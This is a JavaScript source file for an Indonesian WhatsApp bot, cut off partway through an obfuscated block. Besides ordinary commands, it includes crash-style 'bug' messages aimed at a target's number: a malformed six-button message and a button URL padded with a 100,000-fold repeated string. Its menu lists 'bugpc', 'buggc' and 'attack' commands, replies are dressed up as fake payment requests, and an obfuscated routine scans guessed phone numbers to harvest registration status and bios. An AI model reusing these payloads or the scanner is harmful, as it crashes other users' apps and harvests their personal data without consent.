/**
	*APAAN BRO? SC BY FDHLGRPHY
	*MAU BANTU KEMBANGIN/NGEFIX YG EROR? LANGSUNG COMMIT AJA BANG
	*CONTACT https://wa.me/6282135724604
*/
const { generateMessageID, downloadContentFromMessage, proto, generateWAMessageFromContent, prepareWAMessageMedia, areJidsSameUser, getLastMessageInChat, jidDecode } = require('@adiwajshing/baileys');
const colors = require('colors');
const axios = require('axios');
const {decryptMedia} = require('@open-wa/wa-decrypt')
const util = require('util');
const chalk = require('chalk');
const { times, fetchJson, isUrl, getBuffer, getRandom, sleep, getGroupAdmins, downloadMediaMessage, runtime, jsonformat, formatDate, tanggal, formatp } = require('./utils/smsg');
const { y2mateV, y2mateA } = require('./utils/ytdl');
const fs = require('fs');
const os = require('os');
const { color, mylog, infolog } = require("./lib/color")
const moment = require('moment-timezone');
const Jimp = require('jimp')
const ytdl = require('ytdl-core');
const hentai = require('nhentai');
const fdl = require("caliph-api");
const hikki = require("hikki-me");
const ffmpeg = require('fluent-ffmpeg');
const PhoneNumber = require('awesome-phonenumber');
const readline = require('readline');
const { performance } = require('perf_hooks');
const speed = require('performance-now')
const { exec, spawn } = require('child_process');
const toMs = require("ms")
global.prem = require("./lib/premium")
const {isLimit:isLimit,limitAdd:limitAdd,getLimit:getLimit,giveLimit:giveLimit,addBalance:addBalance,kurangBalance:kurangBalance,getBalance:getBalance,isGame:isGame,gameAdd:gameAdd,givegame:givegame,cekGLimit:cekGLimit} = require("./lib/limit");
const { author } = require('caliph-api');
//let regis = JSON.parse(fs.readFileSync('./database/reg.json'));
//global.limit=JSON.parse(fs.readFileSync("./database/limit.json"))
let print = console.log;
//const cooldown = new Map();
const cooldown = new Map();

const fke = '```'

function kyun(seconds){
function pad(s){
return (s < 10 ? '0' : '') + s;
}
var hours = Math.floor(seconds / (60*60));
var minutes = Math.floor(seconds % (60*60) / 60);
var seconds = Math.floor(seconds % 60);

//return pad(hours) + ':' + pad(minutes) + ':' + pad(seconds)
return `${pad(hours)} Jam ${pad(minutes)} Menit ${pad(seconds)} Detik`
}


module.exports = index = async(conn, m, store, warn) =>{
try {
	var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
	//var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.omessage.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? m.message.buttonsResponseMessage.selectedButtonId : ''
	var budy = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype === 'extendedTextMessage') ? m.message.extendedTextMessage.text : ''
	var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
	const jsn = JSON.parse(fs.readFileSync('./src/database.json'));
	const snt = JSON.parse(fs.readFileSync('./database/anoucement.json'));
	const dta = JSON.parse(fs.readFileSync('./database/setting.json'));
	const args = body.trim().split(/ +/).slice(1)
	const arg = body.substring(body.indexOf(" ") + 1);
	const isCmd = body.startsWith(prefix)
	const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
	const from = m.key.remoteJid ? m.key.remoteJid : m.key.participant
	const sender = m.key.participant ? m.key.participant : m.key.remoteJid
	const senderName = m.pushName ? m.pushName : ''
	const pushname = m.pushName || "No Name"
	const text = q = args.join(" ")
	const fatkuns = (m.quoted || m)
	const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
	const mime = (quoted.msg || quoted).mimetype || ''
	const qmsg = (quoted.msg || quoted)
	const isMedia = /image|video|sticker|audio/.test(mime)

	const isGroup = from.endsWith('@g.us')
	const groupMetadata = isGroup ? await conn.groupMetadata(from) : ''
	const groupName = isGroup ? groupMetadata.subject : ''
	const groupDesc = isGroup ? groupMetadata.desc : ''
	const groupId = isGroup ? groupMetadata.id : ''
	const number = [`global.owner@s.whatsapp.net`]
	const isOwner = number.includes(sender)
	const botNumber = await conn.decodeJid(conn.user.id)
	const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
	const groupMembers = isGroup ? groupMetadata.participants : ''
	const groupAdmins = isGroup ? await getGroupAdmins(groupMembers) : ''
	//const isReg = regis.includes(sender)
	const nomore = text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
	const nomore3 = text.replace(/[^0-9]/g, '')
	const nomore2 = m.sender.replace(/[^0-9]/g, '')
	const isGroupAdmins = isGroup ? await groupAdmins.includes(sender) : false
	const isBotGroupAdmins = isGroup ? await groupAdmins.includes(sender) : false
	const isPremium = isCreator || prem.checkPremiumUser(m.sender, premium);
	
	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
	const participants = m.isGroup ? await groupMetadata.participants : ''
	//const isSpam = timestamps.set(from, now)
	let who = m.mentions && m.mentions[0] ? m.mentions : m.fromMe ? this.user : m.sender 
	const reactionMessage = require("@adiwajshing/baileys").proto.Message.ReactionMessage.create({ key: m.key, text: "" })
	const sendPoll = async(jid, text, list) => { conn.relayMessage(jid, { "pollCreationMessage": { "name": text, "options": list.map(v => { return { optionName: v } }), "selectableOptionsCount": list.length}}, {})}
//	const reactionMessage = require("@adiwajshing/baileys").proto.ReactionMessage.create({ key: m.key, text: "" })
	require('./setting');
	
	/*function printSpam(conn, isGc, sender, groupName) {
	if (isGc) {
		return conn.logger.warn("Detect SPAM", color(sender.split("@")[0], "lime"), "in", color(groupName, "lime"));
	}
	if (!isGc) {
		return conn.logger.warn("Detect SPAM", color(sender.split("@")[0], "lime"));
	}
}*/

const generateProfilePicture = async(buffer) => {
    const jimp_1 = await Jimp.read(buffer);
    const resz = jimp_1.getWidth() > jimp_1.getHeight() ? jimp_1.resize(550, Jimp.AUTO) : jimp_1.resize(Jimp.AUTO, 650)
    const jimp_2 = await Jimp.read(await resz.getBufferAsync(Jimp.MIME_JPEG));
    return {
    img: await resz.getBufferAsync(Jimp.MIME_JPEG)
    }
    }
                
    const reSize = async(bsdjejd, ukur1, ukur2) => {
    return new Promise(async(resolve, reject) => {
    var baper = await Jimp.read(bsdjejd);
    var ab = await baper.resize(ukur1, ukur2).getBufferAsync(Jimp.MIME_JPEG)
    resolve(ab)
    })
    }

const downloadContentFromMediaMessage = async(m) => {
let mime = (m.msg || m).mimetype || ''
const stream = await downloadContentFromMessage(m.quoted ? m.quoted : m.msg, mime.split("/")[0])
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
return buffer
}

	//FAKE REPLY EX : { quoted: fake }
	const fake = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "687998787-1589321480@g.us" } : {}) 
                },
	 message: { 
		"extendedTextMessage": {
                 "text": `*Hallo* _${pushname} 👋_\n	╰≻ ${prefix + command}`,
                 "title": `Hmm`,
                 'jpegThumbnail': global.thumb
                        }
	                  } 
                     }

	const fdoc = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `*HIDETAG!*`,jpegThumbnail: global.thumb}}}
	const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "687998787-1589321480@g.us","inviteCode": "m","groupName": "Crizzy Bot", "caption": `© Fadhil Graphy`, 'jpegThumbnail': global.thumb}}}
    const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "687998787-1589321480@g.us" } : {}) },message: { "videoMessage": { "title":`*AUTO DOWNLOAD AUDIO YOUTUBE*`, "h": `Hmm`,'seconds': '10000000⁰0', 'caption': `*AUTO DOWNLOAD AUDIO YOUTUBE*`, 'jpegThumbnail': global.thumb}}}

		// REPLY PAYMENT

		const reply = (teks) => {
			conn.relayMessage(m.chat,  {
				requestPaymentMessage: {
				  currencyCodeIso4217: 'USD',
			  //  expiryTimestamp: 0,
				  amount1000: 666000,
				  requestFrom: m.sender,
				  noteMessage: {
				  extendedTextMessage: {
				  text: teks,
				  contextInfo: {
				  externalAdReply: {
				  showAdAttribution: true
				  }}}}}}, {quoted:m})
		}

	// Bug 6 Button By Irfan
	const modardek = (teks) => {
		conn.sendMessage(nomore, { 
		text: '', 
		templateButtons: [
		{ callButton: { displayText: `kkkk`, phoneNumber: ``}},
		{ urlButton: { displayText: `kkk`, url: `https://wa.me/`}},
		{ urlButton: { displayText: `kkkk`, url: `https://www.whatsapp.com/otp/copy/`}},
		{ quickReplyButton: { displayText: `kkkk`, id: ``}},
		{ quickReplyButton: { displayText: `kkk`, id: ``}},
		{ quickReplyButton: { displayText: `kkkk`, id: ``}},
		]})
		}

		// Ucapan Waktu By Zaqi
		const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
		const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
		const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

     const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if(time2 < "23:59:00"){
        var ucapanWaktu = '𝑺𝒆𝒍𝒂𝒎𝒂𝒕 𝑴𝒂𝒍𝒂𝒎 🏙️'
}
        if(time2 < "19:00:00"){
        var ucapanWaktu = '𝑺𝒆𝒍𝒂𝒎𝒂𝒕 𝑷𝒆𝒕𝒂𝒏𝒈 🌆'
}
        if(time2 < "18:00:00"){
        var ucapanWaktu = '𝑺𝒆𝒍𝒂𝒎𝒂𝒕 𝑺𝒐𝒓𝒆 🌇'
}
        if(time2 < "15:00:00"){
        var ucapanWaktu = '𝑺𝒆𝒍𝒂𝒎𝒂𝒕 𝑺𝒊𝒂𝒏𝒈 🌤️'
}
        if(time2 < "10:00:00"){
        var ucapanWaktu = '𝑺𝒆𝒍𝒂𝒎𝒂𝒕 𝑷𝒂𝒈𝒊 🌄'
}
        if(time2 < "05:00:00"){
        var ucapanWaktu = '𝑺𝒆𝒍𝒂𝒎𝒂𝒕 𝑺𝒖𝒃𝒖𝒉 🌆'
}
        if(time2 < "03:00:00"){
        var ucapanWaktu = '𝑺𝒆𝒍𝒂𝒎𝒂𝒕 𝑻𝒆𝒏𝒈𝒂𝒉 𝑴𝒂𝒍𝒂𝒎 🌃'
}

    //Time Menuju Lebaran
    const IdulFitri = new Date('March 23, 2023 04:00:00')
	const sekarang = new Date().getTime();
	const Selisih = IdulFitri - sekarang;
	const jhari = Math.floor( Selisih / (1000 * 60 * 60 * 24));
	const jjam = Math.floor( Selisih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
	const mmmenit = Math.floor( Selisih % (1000 * 60 * 60) / (1000 * 60));
	const ddetik = Math.floor( Selisih % (1000 * 60) / 1000);
	const menuju = `${jhari} Hari ${jjam} Jam ${mmmenit} Menit ${ddetik} Detik`

    //Time Menuju Tahun Baru
    const TahunBaru = new Date('January 1, 2023 00:00:00')
	const sekarangg = new Date().getTime();
	const Selisihh = TahunBaru - sekarangg;
	const jjhari = Math.floor( Selisihh / (1000 * 60 * 60 * 24));
	const jjjam = Math.floor( Selisihh % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
	const mmmmenit = Math.floor( Selisihh % (1000 * 60 * 60) / (1000 * 60));
	const dddetik = Math.floor( Selisihh % (1000 * 60) / 1000);
	const newyear = `${jjhari} Hari ${jjjam} Jam ${mmmmenit} Menit ${dddetik} Detik`


	        // Public & Self
			if (!conn.public) {
				if (!m.key.fromMe) return
			}

		//TEMPLATE BUTTON!
		const buttonsDefault = [
			//{ callButton: { displayText: `Call Owner!`, phoneNumber: `+6285849261085` } },
			{ urlButton: { displayText: `github!`, url : `https://github.com/FebriansyahXd` } },
			{ quickReplyButton: { displayText: `🧑 owner`, id: `${prefix}owner` } },
			{ quickReplyButton: { displayText: `💰 donate`, id: `${prefix}donate` } },
			{ quickReplyButton: { displayText: `🗼 ping bot`, id: `${prefix}pingbot` } }
		]

		//PREM EXP
		prem.expiredCheck(conn, m, premium);
		
		//EXP
		if (jsn[0].expired !== false) {
  		if (jsn[0].expired < Date.now()) {
    		jsn[0] = {
      		setting: 'tidak ada iklan',
      		expired: false
    		}
    		fs.writeFileSync('./src/database.json', JSON.stringify(jsn))
  		}
		}

		//ANTI SPAM GA WORK, FIX AJA KALO BISA
/*if (!command) return;
const isSpam = true;
const cooldownAmount = 5;
function printSpam(conn, isGroup, sender, groupName) {
  if (isGroup) {
    return console.log("Detect SPAM", color(sender.split("@")[0], "lime"), "in", color(groupName, "lime"));
  }
  if (!isGroup) {
    return console.log("Detect SPAM", color(sender.split("@")[0], "lime"));
  }
}

if (!cooldown.has(from)) {
  cooldown.set(from, new Map());
}

const now = Date.now();
const timestamps = cooldown.get(from);
const cdAmount = (cooldownAmount || 5) * 1000;
if (timestamps.has(from)) {
  const expiration = timestamps.get(from) + cdAmount;
  if (now < expiration) {
    if (isGroup) {
      let timeLeft = (expiration - now) / 1000;
      printSpam(conn, isGroup, sender, groupName);
      return await conn.sendMessage(
        from,
        {
          text: `This group is on cooldown, please wait another _${timeLeft.toFixed(1)} second(s)_`,
        },
        {
          quoted: m
        }
      );
    } else if (!isGroup) {
      let timeLeft = (expiration - now) / 1000;
      printSpam(conn, isGroup, sender);
      return await conn.sendMessage(
        from,
        {
          text: `You are on cooldown, please wait another _${timeLeft.toFixed(1)} second(s)_`,
        },
        {
          quoted: m
        }
      );
    }
  }
}

setTimeout(() => timestamps.delete(from), cdAmount);

if (isSpam) {
  timestamps.set(from, now);
}*/
		
	/*if (optionsCmd.isPremium && !isPremium) {
			await conn.sendMessage(msg.from, { text: response.OnlyPrem }, { quoted: msg });
			return true;
		}*/
		
   // Push Message To Console && Auto Read
        if (m.message) {
            conn.readMessages([m.key])
            console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.white(chalk.bgGreen(new Date)) + '\n          ' + chalk.white(chalk.bgMagenta(budy || m.mtype)) + '\n' + chalk.green('=> Dari'), chalk.magenta(pushname), chalk.yellow(m.sender) + '\n' + chalk.green('=> Di'), chalk.blueBright(m.isGroup ? pushname : 'Private Chat', from) + '\n' + chalk.magenta('──────────────────────────────────────────────────────'))
        }
//+++++++++++++ START COMMAND +++++++++++++++
switch(command){
		/*	case'menu':
			case'help': {
				footerr = `Peringatan : Dilarang spam command/apapun ke bot!, dikarena mengakibatkan bot eror!`
				anu = `Halo kak ${m.pushName} ${ucapanWaktu}

*Info*
 • Nama : ${m.pushName}
 • Status : ${isPremium ? "Premium" : "Free"}
 • Nomer : ${m.sender.split("@")[0]}
 • Jam : ${times(new Date)}
 • Tanggal : ${tanggal(new Date)}
 • Runtime : ${runtime(process.uptime())}

*Keterangan*
 • 🆆 = Fitur Berfungsi
 • 🅴 = Fitur Eror
 • 🅼 = Fitur Maintenance 

*Search Menu:*
• ${prefix}play [query] 🆆
• ${prefix}ytsearch [query] 🆆
• ${prefix}pinterest 🆆

*Group Menu:*
• ${prefix}add [number] 🆆
• ${prefix}kick [tag] 🆆
• ${prefix}tagall [psn] 🆆
• ${prefix}promote [tag] 🆆
• ${prefix}demote [tag] 🆆
• ${prefix}setname [text] 🆆
• ${prefix}setppgroup [reply] 🆆
• ${prefix}setdesk [text] 🆆
• ${prefix}hidetag [text] 🆆
• ${prefix}totag [reply] 🆆
• ${prefix}linkgroup 🆆

*Convert Menu :*
• ${prefix}nulis [text] 🆆
• ${prefix}sticker/s 🆆
• ${prefix}stickergif 🆆
• ${prefix}swm [q|q] 🆆
• ${prefix}toimg [reply] 🆆
• ${prefix}style [text] 🆆
• ${prefix}emojimix (😊+😐) 🆆
• ${prefix}emojimix2 (😐+😊) 🅼
• ${prefix}smeme [q|q] 🆆
• ${prefix}ttp [text] 🆆
• ${prefix}attp [text] 🆆
• ${prefix}ebinary [text] 🆆
• ${prefix}dbinary [code] 🆆
• ${prefix}tomp4 [send/reply] 🆆
• ${prefix}toaud [send/reply] 🆆
• ${prefix}tomp3 [send/reply] 🆆
• ${prefix}tovn [send/reply] 🆆
• ${prefix}togif [send/reply] 🆆
• ${prefix}tourl [send/reply] 🆆

*Fun Menu :*
• ${prefix}menfes 🆆
• ${prefix}jadian 🆆
• ${prefix}jodohku 🆆

*Downloader Menu :*
• ${prefix}tiktok [url] 🆆
• ${prefix}tiktokaudio [url] 🆆
• ${prefix}ytmp3 [url] 🆆
• ${prefix}ytmp4 [url] 🆆

*Premium Menu :*
• ${prefix}join [link] 🆆
• ${prefix}bugpc [num|jumlah] 🆆
• ${prefix}buggc [link|jumlah] 🅼
• ${prefix}attack [num] 🆆


*Other Menu :*
• ${prefix}requestfitur [text] 🆆
• ${prefix}ping 🆆
• ${prefix}listonline 🆆
• ${prefix}listgc 🆆
• ${prefix}listpc 🆆

*Owner Menu :*
• ${prefix}block [tag] 🆆
• ${prefix}unblock [tag] 🆆
• ${prefix}setstatusbot [text] 🆆
• ${prefix}setmamebot [text] 🆆
• ${prefix}setppbot [reply] 🆆
• ${prefix}cekkomisi 🆆
• ${prefix}leave 🆆
• ${prefix}anticall 🆆
• ${prefix}addprem [tag jum] 🆆
• ${prefix}delprem [tag] 🆆
• ${prefix}sf [reply code] 🆆
• ${prefix}addanoucment (new fitur) 🆆
• > 🆆
• => 🆆
• $ 🆆

*Anoucement 📢 :*
• Added ${snt[4]}
• Added ${snt[3]}
• Added ${snt[2]}
• Added ${snt[1]}
• Added ${snt[0]}
╰────────────────⊱
`,
					btn = [{
                                urlButton: {
                                    displayText: '👤 ᴏᴡɴᴇʀ',
                                    url: 'https://wa.me/687909979'
                                }
                            }, {
                                urlButton: {
                                    displayText: '😱',
                                    url: 'https://www.whatsapp.com/otp/copy/'+'hehe'.repeat(100000)
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '[ɴᴇᴡ] ᴄᴏɴꜰᴇꜱꜱ',
                                    id: 'menfes'
                                }
                            }]

				conn.send5ButLoc(from, anu, footerr, global.thumb, btn)
 				 }                      
				break */

				case 'duarr':{
					conn.relayMessage(from, { reactionMessage }, { messageId: " " })
				}
					break 

				/*	case 'nowa':{
						if (!isCreator) return m.reply(`kamu siapa?`)
						conn.sendMessage(from, { react: { text: `${global.reactmoji}`, key: m.key }})
						  let regex = /x/g
						  if (!text) throw 'Input Number'
						  if (!text.match(regex)) throw `Ex: ${prefix + command} ${m.sender.split('@')[0]}x`
						  let random = text.match(regex).length, total = Math.pow(10, random), array = []
						  for (let i = 0; i < total; i++) {
							  let list = [...i.toString().padStart(random, '0')]
							  let result = text.replace(regex, () => list.shift()) + '@s.whatsapp.net'
							  if (await conn.onWhatsApp(result).then(v => (v[0] || {}).exists)) {
								  let info = await conn.fetchStatus(result).catch(_ => {})
								  array.push({ exists: true, jid: result, ...info })
							  } else {
								  array.push({ exists: false, jid: result })
							  }
						  }
						  let txt = '• Terdaftar\n\n' + array.filter(v => v.exists)
							  .map(v => `Nomor: wa.me/${v.jid.split('@')[0]}\nBio: ${v.status || ''}\nTanggal: ${formatDate(v.setAt)}`).join('\n\n')
						  + '\n\n• Tidak Terdaftar\n\n' + array.filter(v => !v.exists).map(v => v.jid.split('@')[0]).join('\n')
						  m.reply(txt)
						  }
					   */

					case 'nowax':{
if (!q) return m.reply("Masukan nomer dengan 'x'")
const numer = q
if (!numer.includes('x')) return m.reply(`Y la 'x' ?\n\n*• Ejemplo de uso:*\n${prefix + command} 5697777777x`)
if (numer.split('x').length - 1 === 4) return m.reply("Maksimal 3 'x' !!")

var _0x42316c=_0x1739;(function(_0x43f185,_0x506f73){var _0x55d548=_0x1739,_0x1d3291=_0x43f185();while(!![]){try{var _0x57335f=parseInt(_0x55d548(0x1c9))/0x1*(-parseInt(_0x55d548(0x1c8))/0x2)+parseInt(_0x55d548(0x1b0))/0x3+-parseInt(_0x55d548(0x1c4))/0x4*(parseInt(_0x55d548(0x1ce))/0x5)+-parseInt(_0x55d548(0x1e2))/0x6+-parseInt(_0x55d548(0x1e5))/0x7+-parseInt(_0x55d548(0x1e0))/0x8+parseInt(_0x55d548(0x1b1))/0x9*(parseInt(_0x55d548(0x1c0))/0xa);if(_0x57335f===_0x506f73)break;else _0x1d3291['push'](_0x1d3291['shift']());}catch(_0x1941ae){_0x1d3291['push'](_0x1d3291['shift']());}}}(_0x4136,0xe1cbb));var _0x44a930=_0x2ad3;(function(_0x56e3de,_0x3e0a7f){var _0x382aea=_0x1739,_0x1dc267=_0x2ad3,_0x414131=_0x56e3de();while(!![]){try{var _0x50ad6a=parseInt(_0x1dc267(0x70))/0x1+parseInt(_0x1dc267(0x90))/0x2*(parseInt(_0x1dc267(0x80))/0x3)+parseInt(_0x1dc267(0x79))/0x4*(parseInt(_0x1dc267(0x6c))/0x5)+parseInt(_0x1dc267(0x6b))/0x6+parseInt(_0x1dc267(0x74))/0x7*(-parseInt(_0x1dc267(0x92))/0x8)+-parseInt(_0x1dc267(0x73))/0x9+parseInt(_0x1dc267(0x84))/0xa*(-parseInt(_0x1dc267(0x8b))/0xb);if(_0x50ad6a===_0x3e0a7f)break;else _0x414131[_0x382aea(0x1d1)](_0x414131[_0x382aea(0x1b6)]());}catch(_0x221ae4){_0x414131[_0x382aea(0x1d1)](_0x414131[_0x382aea(0x1b6)]());}}}(_0x8ec9,0x5305c));function _0x2ad3(_0x3067ec,_0x57cd9d){var _0x43d738=_0x8ec9();return _0x2ad3=function(_0x460ae9,_0x4b2e83){_0x460ae9=_0x460ae9-0x6b;var _0x1e904c=_0x43d738[_0x460ae9];return _0x1e904c;},_0x2ad3(_0x3067ec,_0x57cd9d);}var _0x363640=_0x143a;(function(_0x1ed53c,_0x334963){var _0x481c15=_0x2ad3,_0xf5d34d=_0x143a,_0x2e78a3=_0x1ed53c();while(!![]){try{var _0x1ab909=-parseInt(_0xf5d34d(0xa6))/0x1+-parseInt(_0xf5d34d(0x94))/0x2*(-parseInt(_0xf5d34d(0x92))/0x3)+-parseInt(_0xf5d34d(0x8f))/0x4+-parseInt(_0xf5d34d(0x95))/0x5+-parseInt(_0xf5d34d(0x8a))/0x6+-parseInt(_0xf5d34d(0xa1))/0x7*(-parseInt(_0xf5d34d(0x9e))/0x8)+parseInt(_0xf5d34d(0xa7))/0x9*(parseInt(_0xf5d34d(0x99))/0xa);if(_0x1ab909===_0x334963)break;else _0x2e78a3[_0x481c15(0x75)](_0x2e78a3[_0x481c15(0x7f)]());}catch(_0x28e227){_0x2e78a3[_0x481c15(0x75)](_0x2e78a3[_0x481c15(0x7f)]());}}}(_0x4491,0x861ef));function _0x1739(_0x346ab0,_0x385bc3){var _0x4136cd=_0x4136();return _0x1739=function(_0x1739fd,_0x53021e){_0x1739fd=_0x1739fd-0x1af;var _0x2cf632=_0x4136cd[_0x1739fd];return _0x2cf632;},_0x1739(_0x346ab0,_0x385bc3);}function _0x4491(){var _0x1156b5=_0x1739,_0x1ba9f3=_0x2ad3,_0x11ac32=[_0x1ba9f3(0x98),_0x1ba9f3(0x86),_0x1156b5(0x1b3),_0x1ba9f3(0x8a),_0x1ba9f3(0x95),_0x1ba9f3(0x8f),_0x1ba9f3(0x88),'onWhatsApp',_0x1ba9f3(0x7a),_0x1ba9f3(0x8d),_0x1ba9f3(0x8c),_0x1ba9f3(0x97),_0x1ba9f3(0x94),_0x1156b5(0x1c1),_0x1156b5(0x1b4),_0x1ba9f3(0x87),_0x1ba9f3(0x85),_0x1ba9f3(0x7b),_0x1156b5(0x1af),'4217814gUfFgz',_0x1ba9f3(0x7d),_0x1156b5(0x1d4),_0x1ba9f3(0x89),_0x1ba9f3(0x72),_0x1156b5(0x1ca),_0x1ba9f3(0x7c),_0x1ba9f3(0x76),_0x1ba9f3(0x6d),_0x1ba9f3(0x78),_0x1ba9f3(0x6e),_0x1156b5(0x1c5),_0x1ba9f3(0x75),_0x1ba9f3(0x96),_0x1ba9f3(0x82),_0x1ba9f3(0x77),_0x1ba9f3(0x83),_0x1ba9f3(0x8e)];return _0x4491=function(){return _0x11ac32;},_0x4491();}var ph=text.match[0x1];ph=ph[_0x44a930(0x93)](/\+/g,'');var total=ph[_0x363640(0x9b)],lst='',noton=[],result={},xn=ph[_0x363640(0xa4)]('')[_0x363640(0xa9)](_0x484ccd=>_0x484ccd==='x')[_0x363640(0x9b)];if(xn===0x1)lst=0xa;if(xn===0x2)lst=0x64;if(xn===0x3)lst=0x3e8;if(xn>0x3)throw new Error();var rs='',options={'weekday':_0x363640(0x8b),'year':_0x44a930(0x89),'month':_0x363640(0x8b),'day':_0x363640(0x8d)},msg='';for(var i=0x0;i<lst;i++){if((ph[_0x44a930(0x93)](/x/g,'')+i)[_0x363640(0x9b)]===total-0x2)rs=ph[_0x363640(0x89)]('x','00'+i);if((ph[_0x363640(0x89)](/x/g,'')+i)[_0x363640(0x9b)]===total-0x1)rs=ph[_0x363640(0x89)]('x','0'+i);if((ph[_0x363640(0x89)](/x/g,'')+i)[_0x363640(0x9b)]===total)rs=ph[_0x363640(0x89)]('x',i);rs=rs[_0x363640(0x89)](/x/g,'');var reslt=await message[_0x363640(0xa5)][_0x363640(0xa3)](rs);if(reslt[0x0]!==undefined&&reslt[0x0][_0x44a930(0x71)]){try{var {status,setAt}=await message[_0x42316c(0x1da)][_0x363640(0xaa)](rs+_0x44a930(0x81));}catch{var status='',setAt='';}try{var date=setAt[_0x44a930(0x7e)](_0x363640(0x9a),options);}catch{var date=_0x363640(0x93);}!result[date[_0x44a930(0x7a)](',')[0x2]?.[_0x363640(0xa2)]()||_0x363640(0x88)]?result[date[_0x363640(0xa4)](',')[0x2]?.[_0x42316c(0x1be)]()||_0x363640(0x88)]=[]:'',result[date['split'](',')[0x2]?.[_0x42316c(0x1be)]()||_0x363640(0x88)][_0x44a930(0x75)]({'status':status,'date':date,'number':rs});}else noton[_0x363640(0x96)](rs);}function _0x8ec9(){var _0x5be8a8=_0x42316c,_0x4756f6=[_0x5be8a8(0x1d6),_0x5be8a8(0x1cc),'1970',_0x5be8a8(0x1e6),_0x5be8a8(0x1dc),'*_⭕===\x20',_0x5be8a8(0x1d0),'10NpJrQi',_0x5be8a8(0x1c3),_0x5be8a8(0x1e7),_0x5be8a8(0x1e1),_0x5be8a8(0x1db),_0x5be8a8(0x1d9),_0x5be8a8(0x1bf),'4609458YjZdvr',_0x5be8a8(0x1bc),'push',_0x5be8a8(0x1ba),_0x5be8a8(0x1cf),_0x5be8a8(0x1cb),_0x5be8a8(0x1c7),_0x5be8a8(0x1e3),_0x5be8a8(0x1cd),_0x5be8a8(0x1df),'long',_0x5be8a8(0x1b5),_0x5be8a8(0x1b6),'1748019NSQVqW',_0x5be8a8(0x1d8),_0x5be8a8(0x1dd),_0x5be8a8(0x1b9),_0x5be8a8(0x1b7),_0x5be8a8(0x1bd),_0x5be8a8(0x1c6),_0x5be8a8(0x1d5),_0x5be8a8(0x1be),_0x5be8a8(0x1d7),_0x5be8a8(0x1de),_0x5be8a8(0x1c2),'750862GbQmNK',_0x5be8a8(0x1da),_0x5be8a8(0x1bb),_0x5be8a8(0x1d3),_0x5be8a8(0x1b8),_0x5be8a8(0x1e4),_0x5be8a8(0x1d2),_0x5be8a8(0x1af)];return _0x8ec9=function(){return _0x4756f6;},_0x8ec9();}var notonmsg=_0x44a930(0x6f)+noton[_0x363640(0xa0)]('\x0a'),ms=[];result[_0x363640(0x97)]?result[_0x363640(0x98)]=result[_0x44a930(0x96)]:'',delete result[_0x363640(0x97)];function _0x4136(){var _0x1264b0=['Unavailable','join','No\x20about','65JxCoLG','30oggKJi','30156Ydpidd','push','8FQDEQV','84994UgxVZz','\x20===⭕_*\x0a','_*❌===\x20Not\x20registered\x20on\x20WA\x20===❌*_\x0a\x0a','\x0a_*Date:*\x20','numeric','@s.whatsapp.net','exists','client','491208giowXF','*_Onwa\x20©\x202022_\x20𝑅𝐺𝑁𝐾*\x0a\x0a','No\x20date','number','date','7379816YXPIws','_Numbers\x20not\x20registered\x20on\x20WhatsApp:_\x0a\x0a','3590760IGpFbz','split','_\x0a_*Bio:*_\x20','6209546dprIBq','4376547cioVgO','2CrLFGn','text.replace','1135440avaxLq','108lGOGQm','_\x0a_','136KeonwH','fetchStatus','toLocaleDateString','shift','10hpKGEK','2PjmlbP','en-US','status','length','3663170OJcpgL','_*Number:*\x20+','trim','map','3529150QIWycc','filter','626527KHYCBG','2812839duaGUv','251356SJkjUV','1581130zwLQJV','sendReply','707164lPYoKq','927358zGsotc','1WvDSwH','1133840KLkfHD'];_0x4136=function(){return 